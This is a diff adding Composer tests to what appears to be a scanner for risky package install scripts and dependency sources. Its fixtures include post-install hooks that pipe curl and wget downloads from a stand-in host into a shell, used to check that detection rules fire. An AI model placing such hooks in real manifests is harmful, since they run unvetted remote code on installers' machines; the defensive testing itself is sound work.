@@ -110,6 +110,31 @@ class TestInstallScripts(unittest.TestCase):
         self.assertEqual(scan("package.json", "{ not json"), [])
 
 
+class TestComposer(unittest.TestCase):
+    """PHP's manifest, which runs scripts on install exactly as npm does."""
+
+    def test_a_composer_lifecycle_script(self):
+        text = '{\n  "scripts": {\n    "post-install-cmd": "curl -s https://x.invalid/i.sh | sh"\n  }\n}'
+        self.assertIn("SC002", rule_ids(scan("composer.json", text)))
+
+    def test_composer_writes_scripts_as_lists_too(self):
+        text = (
+            '{\n  "scripts": {\n    "post-install-cmd": [\n      "php artisan clear",\n'
+            '      "wget -qO- https://x.invalid/i.sh | bash"\n    ]\n  }\n}'
+        )
+        findings = scan("composer.json", text)
+        self.assertIn("SC002", rule_ids(findings))
+        self.assertEqual(findings[0].line, 5)
+
+    def test_a_require_on_a_branch(self):
+        text = '{\n  "require": {\n    "acme/lib": "git+https://x.invalid/acme/lib.git"\n  }\n}'
+        self.assertIn("SC003", rule_ids(scan("composer.json", text)))
+
+    def test_an_ordinary_composer_file_is_quiet(self):
+        text = '{\n  "require": {\n    "monolog/monolog": "^3.0"\n  }\n}'
+        self.assertEqual(scan("composer.json", text), [])
+
+
 class TestSourceDependencies(unittest.TestCase):
     def package(self, dependencies_block):
         return '{\n  "name": "app",\n  "dependencies": {\n' + dependencies_block + "\n  }\n}\n"
